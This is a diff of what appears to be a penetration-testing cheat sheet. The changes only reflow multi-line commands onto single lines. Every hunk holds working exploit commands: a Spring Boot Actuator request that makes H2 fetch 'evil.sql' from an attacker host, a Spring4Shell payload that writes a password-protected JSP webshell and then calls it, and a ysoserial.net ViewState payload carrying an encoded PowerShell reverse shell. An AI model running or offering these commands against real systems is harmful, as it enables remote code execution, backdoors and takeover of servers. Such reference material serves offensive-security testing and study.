@@ -98,9 +98,7 @@ jhat heapdump.hprof    # browse at http://localhost:7000
 ```bash
 # 1. Set a property that triggers code execution on restart
 # Example: spring.datasource.url with H2 INIT parameter
-curl -X POST http://target.com/actuator/env \
-  -H "Content-Type: application/json" \
-  -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\''http://<AttackerIP>/evil.sql'\''"}'
+curl -X POST http://target.com/actuator/env -H "Content-Type: application/json" -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\''http://<AttackerIP>/evil.sql'\''"}'
 
 curl -X POST http://target.com/actuator/restart
 ```
@@ -227,8 +225,7 @@ Spring MVC with JDK 9+, Tomcat as WAR deployment.
 
 ```bash
 # Exploit — write a JSP webshell
-curl -X POST http://target.com/vuln-endpoint \
-  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&c1=Runtime&c2=<%&suffix=%%>%0A'
+curl -X POST http://target.com/vuln-endpoint -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&c1=Runtime&c2=<%&suffix=%%>%0A'
 
 # Access the dropped shell
 curl "http://target.com/tomcatwar.jsp?pwd=j&cmd=id"
@@ -501,17 +498,10 @@ curl 'http://target.com/lfi?file=../../../../inetpub/wwwroot/web.config'
 # Extract: <machineKey decryptionKey="..." validationKey="..." decryption="AES" validation="SHA1"/>
 
 # 2. Generate payload with ysoserial.net
-ysoserial.exe -p ViewState \
-  -g TextFormattingRunProperties \
-  --decryptionalg="AES" \
-  --decryptionkey="<decryptionKey>" \
-  --validationalg="SHA1" \
-  --validationkey="<validationKey>" \
-  -c "powershell -e <b64_encoded_reverse_shell>"
+ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="<decryptionKey>" --validationalg="SHA1" --validationkey="<validationKey>" -c "powershell -e <b64_encoded_reverse_shell>"
 
 # 3. Submit payload in __VIEWSTATE POST parameter to any .aspx page
-curl -X POST http://target.com/page.aspx \
-  -d "__VIEWSTATE=<payload>&__VIEWSTATEGENERATOR=<generator_value>"
+curl -X POST http://target.com/page.aspx -d "__VIEWSTATE=<payload>&__VIEWSTATEGENERATOR=<generator_value>"
 ```
 
 ### .NET Insecure Deserialization
